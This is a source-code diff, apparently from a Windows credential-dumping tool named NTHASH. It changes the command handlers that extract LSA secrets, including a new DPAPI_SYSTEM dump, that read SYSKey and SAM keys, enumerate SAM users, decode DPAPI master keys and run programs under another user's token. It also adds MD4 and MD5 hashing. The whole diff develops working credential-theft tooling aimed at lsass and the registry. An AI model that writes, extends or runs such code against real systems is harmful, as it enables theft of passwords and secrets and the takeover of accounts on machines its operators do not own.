@@ -1062,14 +1062,17 @@ begin
   log('NTHASH /base64encode /input:string',1);
   log('NTHASH /base64decode /input:base64string',1);
   //****************************************************
-  log('NTHASH /dpapi',1);
+  log('NTHASH /dpapimk',1);
   log('NTHASH /cryptunprotectdata /binary:filename',1);
   log('NTHASH /cryptunprotectdata /input:string',1);
   log('NTHASH /cryptprotectdata /input:string',1);
   log('NTHASH /decodeblob /binary:filename',1);
   log('NTHASH /decodemk /binary:filename',1);
   log('NTHASH /getsha1hash /input:password',1);
-  log('NTHASH /getlsasecrets /input:secret',1);
+  //log('NTHASH /getmd5hash /input:password',1);
+  //log('NTHASH /getmd4hash /input:password',1);
+  log('NTHASH /getlsasecret /input:secret',1);
+  log('NTHASH /dpapi_system /input:secret',1);
   //****************************************************
   log('NTHASH /runasuser /user:username /password:password [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /runastoken /pid:12345 [/binary:x:\folder\bin.exe]',1);
@@ -1163,7 +1166,7 @@ begin
         end;
      goto fin;
      end;
-  p:=pos('/dpapi',cmdline);
+  p:=pos('/dpapimk',cmdline);
   if p>0 then
      begin
      findlsakeys (lsass_pid,deskey,aeskey,iv );
@@ -1305,7 +1308,7 @@ begin
         log('SYSKey:'+ByteToHexaString(SYSKey) ,1);
         if getsamkey(syskey,samkey)
            then log('SAMKey:'+ByteToHexaString(samkey) ,1)
-           else log('getsamkey NOT OK' ,1);
+           else log('getsamkey NOT OK, try adding /system' ,1);
         end //if getsyskey(syskey) then
         else log('getsyskey NOT OK' ,1);
      goto fin;
@@ -1322,7 +1325,7 @@ begin
               log('SAMKey:'+ByteToHexaString(samkey) ,1);
               query_samusers (samkey,@callback_SamUsers );
               end //if getsamkey(syskey,samkey)
-           else log('getsamkey NOT OK' ,1);
+           else log('getsamkey NOT OK, try adding /system' ,1);
         end //if getsyskey(syskey) then
         else log('getsyskey NOT OK' ,1);
      goto fin;
@@ -1603,13 +1606,26 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
    goto fin;
    end;
   //****************************************************
-  p:=pos('/lsasecrets',cmdline);
+  p:=pos('/getlsasecret',cmdline);
   if p>0 then
      begin
      if input='' then exit;
      if lsasecrets(input,output_)=false
         then log('lsasecrets failed',1)
         else log(ByteToHexaString (output_),1);
+     goto fin;
+     end;
+  p:=pos('/dpapi_system',cmdline);
+  if p>0 then
+     begin
+     input:='dpapi_system';
+     if lsasecrets(input,output_)=false
+        then log('lsasecrets failed',1)
+        else
+        begin
+        CopyMemory( @output_ [0],@output_ [4],length(output_)-4);
+        log(ByteToHexaString (output_),1);
+        end;
      goto fin;
      end;
   //******************* CRYPT **************************
@@ -1647,9 +1663,25 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
   p:=pos('/getsha1hash',cmdline);
       if p>0 then
            begin
-
-           if crypto_hash ($00008004,pointer(HexaStringToByte2(input)),24,output_,20)
-              then log(ByteToHexaString(output_),1);
+           //SHA_DIGEST_LENGTH=20
+           if crypto_hash ($00008004,pointer(HexaStringToByte2(input)),length(input) div 2,output_,20)
+              then log(ByteToHexaString(output_),1)
+              else log('NOT OK',1);
+           goto fin;
+           end;
+  p:=pos('/getmd5hash',cmdline);
+      if p>0 then
+           begin
+           //MD5_DIGEST_LENGTH=16
+           if crypto_hash ($00008003,pointer(HexaStringToByte2(input)),length(input) div 2,output_,16)
+                  then log(ByteToHexaString(output_),1);
+           goto fin;
+           end;
+  p:=pos('/getmd4hash',cmdline);
+      if p>0 then
+           begin
+           if crypto_hash ($00008002,pointer(HexaStringToByte2(input)),length(input) div 2,output_,16)
+                   then log(ByteToHexaString(output_),1);
            goto fin;
            end;
   //********* BROWSER ****************************************
